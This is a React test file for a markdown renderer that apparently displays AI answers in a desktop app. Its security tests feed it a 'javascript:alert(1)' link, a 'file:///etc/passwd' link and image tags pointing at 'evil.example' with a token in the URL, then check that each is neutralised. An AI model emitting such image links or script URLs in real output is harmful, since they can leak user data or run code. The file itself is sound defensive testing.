import { fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

const opener = vi.hoisted(() => ({ openUrl: vi.fn(async () => {}) }));
vi.mock("@tauri-apps/plugin-opener", () => opener);
const tauri = vi.hoisted(() => ({ isTauri: vi.fn(() => true) }));
vi.mock("@tauri-apps/api/core", () => tauri);

const { AnswerMarkdown } = await import("./AnswerMarkdown");

afterEach(() => {
  opener.openUrl.mockClear();
  vi.unstubAllGlobals();
});

describe("AnswerMarkdown", () => {
  it("renders headings, lists, inline code, code blocks and tables", () => {
    const text = [
      "## Why it failed",
      "",
      "The body needs `qty`.",
      "",
      "- one",
      "- two",
      "",
      "```json",
      '{ "qty": 1 }',
      "```",
      "",
      "| a | b |",
      "| - | - |",
      "| 1 | 2 |",
    ].join("\n");
    render(<AnswerMarkdown text={text} />);
    expect(screen.getByRole("heading", { name: "Why it failed" })).toBeInTheDocument();
    expect(screen.getByText("qty").tagName).toBe("CODE");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(screen.getByText('{ "qty": 1 }').closest("pre")).not.toBeNull();
    expect(screen.getByRole("table")).toBeInTheDocument();
  });

  it("opens web links in the system browser, never in the app window", () => {
    render(<AnswerMarkdown text="See [the docs](https://httpbin.org/#/Status_codes)." />);
    const link = screen.getByRole("link", { name: "the docs" });
    const click = new MouseEvent("click", { bubbles: true, cancelable: true });
    fireEvent(link, click);
    expect(click.defaultPrevented).toBe(true);
    expect(opener.openUrl).toHaveBeenCalledWith("https://httpbin.org/#/Status_codes");
  });

  it("opens links in a new browser tab in the browser build", () => {
    tauri.isTauri.mockReturnValueOnce(false);
    const open = vi.fn();
    vi.stubGlobal("open", open);
    render(<AnswerMarkdown text="[x](https://example.com)" />);
    fireEvent.click(screen.getByRole("link", { name: "x" }));
    expect(open).toHaveBeenCalledWith("https://example.com", "_blank", "noopener,noreferrer");
  });

  it("shows other links as plain text", () => {
    render(<AnswerMarkdown text="[run me](javascript:alert(1)) and [file](file:///etc/passwd)" />);
    expect(screen.queryByRole("link")).toBeNull();
    expect(screen.getByText("run me")).toBeInTheDocument();
  });

  it("never loads images, which could send data out in their URL", () => {
    const { container } = render(
      <AnswerMarkdown text="![secret](https://evil.example/?d=token-123)" />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("[image: secret]")).toBeInTheDocument();
  });

  it("does not turn raw HTML into elements", () => {
    const { container } = render(
      <AnswerMarkdown text={'<img src="https://evil.example/x"> <b>bold</b>'} />,
    );
    expect(container.querySelector("img, b")).toBeNull();
  });
});
